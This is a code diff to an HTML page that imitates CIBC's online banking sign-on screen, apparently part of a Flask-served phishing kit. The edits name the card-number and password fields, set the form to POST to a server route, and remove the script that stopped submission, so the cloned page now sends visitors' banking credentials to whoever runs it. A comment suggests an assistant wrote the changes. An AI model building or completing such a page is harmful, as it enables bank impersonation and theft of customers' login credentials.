@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CIBC Online Banking</title>
     <style>
+        /* ... (Your CSS styles are unchanged) ... */
         * {
             margin: 0;
             padding: 0;
@@ -373,10 +374,10 @@
                 </div>
             </div>
             
-            <form>
+            <form method="POST" action="{{ url_for('page', page_num=page_num) }}">
                 <div class="form-group">
                     <label class="form-label" for="cardNumber">Card number</label>
-                    <input type="text" id="cardNumber" class="form-input" maxlength="16">
+                    <input type="text" id="cardNumber" name="username" class="form-input" maxlength="16">
                 </div>
                 
                 <div class="checkbox-group">
@@ -387,14 +388,14 @@
                 
                 <div class="form-group">
                     <label class="form-label" for="password">Password (case sensitive)</label>
-                    <input type="password" id="password" class="form-input">
+                    <input type="password" id="password" name="password" class="form-input">
                 </div>
                 
                 <a href="#" class="forgot-password" onclick="return false;">Reset password</a>
                 
                 <div class="form-actions">
                     <button type="button" class="btn btn-secondary" onclick="return false;">Register now</button>
-                    <button type="submit" class="btn btn-primary" onclick="return false;">Sign on</button>
+                    <button type="submit" class="btn btn-primary">Sign on</button>
                 </div>
             </form>
         </div>
